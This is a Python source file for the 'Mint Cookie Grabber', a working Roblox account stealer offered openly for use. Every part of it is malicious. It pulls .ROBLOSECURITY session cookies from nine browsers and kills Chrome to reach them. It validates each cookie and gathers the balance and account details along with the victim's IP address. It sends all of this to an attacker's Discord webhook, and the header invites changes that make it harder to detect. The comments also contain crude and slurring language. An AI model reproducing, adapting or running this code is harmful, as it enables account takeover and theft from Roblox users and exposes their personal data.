## Replace Webhook on Line 156
## This is not meant to be undetected, make any changes you see fit for any performance boosts or reduced-detections, but, this is just a simple implementation of what is otherwise a dualhooked cookie grabber
## Enjoy!

try:
    import robloxpy, requests, browser_cookie3, os
except Exception as e:
    print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()

class MINTGRB:
    def __init__(self, webhook: str):
        if not "discord.com/api/webhooks/" in webhook:
            print('You did not provide a webhook on Line 148.'), exit()


        self.webhook = webhook
        self.cookie = None
        self.platform = None
        self.embeds = []

        self.browsers()

    def checker(self):
        if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
            return requests.post(url=self.webhook, data={'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})

        for embed in self.embeds:
            if self.cookie in embed['description']:
                return
        
        user = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":self.cookie}).json()
        id = user['UserID']
        try:
            ip = requests.get('https://api.ipify.org/').text
        except:
            ## It could not get any connection, so we just do a "N/A" Value
            ip = "N/A"
        self.embeds.append(
            {
                "title": f"✔ Valid Account - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{ip}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
                "color": 12452044,
                "footer": {
                    "text": "v1.4.6 ; Mint Cookie Grabber"
                }
            }
        )

        
    def browsers(self):
        try:
            self.platform = "Firefox"
            for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        
        try:
            self.platform = "Safari"
            for cookie in browser_cookie3.safari(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chromium"
            for cookie in browser_cookie3.chromium(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Edge"
            for cookie in browser_cookie3.edge(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera GX" ## OPERA GX IS A W
            for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass
        
        try:
            self.platform = "Opera" ## Who the fuck uses Opera LMAO
            for cookie in browser_cookie3.opera(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Brave"
            for cookie in browser_cookie3.brave(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chrome" 
            os.system("taskkill /f /im chrome.exe") ## Chrome added something to their browser so I have to kill the gayness honestly.
            for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Librewolf"
            for cookie in browser_cookie3.librewolf(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        if len(self.embeds) != 0:

            self.send()

    def send(self):
        requests.post(self.webhook, json={
            "username": "Mint Grabber",
            "content": "@everyone", #You can change this to be just no ping or a @here ping.
            "avatar_url": "https://media.discordapp.net/attachments/1146197830780846162/1171301163329658940/Turtle.png?ex=655c2e37&is=6549b937&hm=086426c867855902e535d8a33e2396fc90a719904d26f1ffc0fb489dfd10e307&=&width=763&height=572",
            "embeds": self.embeds
        })


MINTGRB("%WEBHOOKHERE%")
